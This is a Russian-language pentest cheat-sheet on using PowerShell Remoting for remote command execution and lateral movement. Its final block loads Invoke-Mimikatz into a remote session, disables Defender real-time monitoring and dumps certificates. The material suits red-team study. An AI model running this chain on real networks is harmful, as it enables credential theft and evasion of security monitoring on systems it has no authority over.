# Удаленный запуск скриптов (with privesc)

## Intro

Есть легальный способ удаленного запуска скриптов на других тачках (как **psexec**, но разрешено системой)

Включено по умолчанию, начиная с Windows Server 2012

Возможно, понадобиться включить удаленное исполнение (**Enable-PSRemoting**) на Win Desktop машине (привилегии админа для этого необходимы)

Мы получим shell **с повышенными  правами** на удаленной системе, если admin creds используются для аутентификации (это настройки по умолчаний).

## PowerShell Remoting

### One-to-One

PSSession\
\- Интерактивная\
\- Запускается в новом процессе (`wsmprovhost`)\
\- Stateful

Использует cmdlets:\
\- `New-PSSession`\
\- `Enter-PSSession`

### One-to-Many (Fan-out)

не интерактивна\
команды запускаются параллельно

Использует cmdlets:\
\- `Invoke-Command`

### Invoke-Command

Запускает команды и скрипты:\
\- на нескольких удаленных компьютерах\
\- in disconnected sessions (v3)\
\- как фоновая служба и многое др

Лучшая штука в PowerShell для передачи хешей, использования кредов и запуска команд на множестве удаленных компьютеров

Для передачи username/password использовать параметр **-Credential**

## Примеры

### Basic Usage

```powershell
# Новая сессия
$target_sess = New-PSSession -ComputerName TARGET
# Список доступных сессий PSRemoting
Get-PSSession
# Зайти в сессию (сможем выполнять команды на удаленном сервере с правами текущего пользователя)
Enter-PSSession $target_sess
# Закрыть сессию
Remove-PSSession $target_sess
```

### Подключение с использованием логина и пароля

```powershell
$Username = 'domain\myuser'
$Password = 'P@ssw0rd'
$pass = ConvertTo-SecureString -AsPlainText $Password -Force
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass

Invoke-Command -ComputerName TARGET.domain.corp -ScriptBlock {whoami; hostname} -Credential $Cred

$target_sess = New-PSSession -ComputerName target.domain.corp -Credential $Cred
Enter-PSSession $target_sess
```

### Invoke-Command

```powershell
# Для запуска команд или скриптов, разделенных точкой с запятой
Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

# Для запуска скриптов из файлов:
Invoke-Command –FilePath C:\MyScript.ps1 -ComputerName (Get-Content <list_of_servers>)

# Для запуска Stateful команд:
$Sess = New-PSSession –Computername SomeServer1
Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name} 
```

При соединении с удаленным сервером будет импортирован Invoke-Mimikatz.ps1

```powershell
[my comp] PS> powershell -ep bypass
[my comp] PS> $Sess = New-PSSession –Computername SomeServer1
[my comp] PS> Invoke-Command –Session $Sess -FilePath .\Invoke-Mimikatz.ps1
[my comp] PS> Enter-PSSession $Sess
[SomeServer1] PS> Set-MpPreference -DisableRealtimeMonitoring $true
[SomeServer1] PS> Invoke-Mimikatz -DumpCerts

```

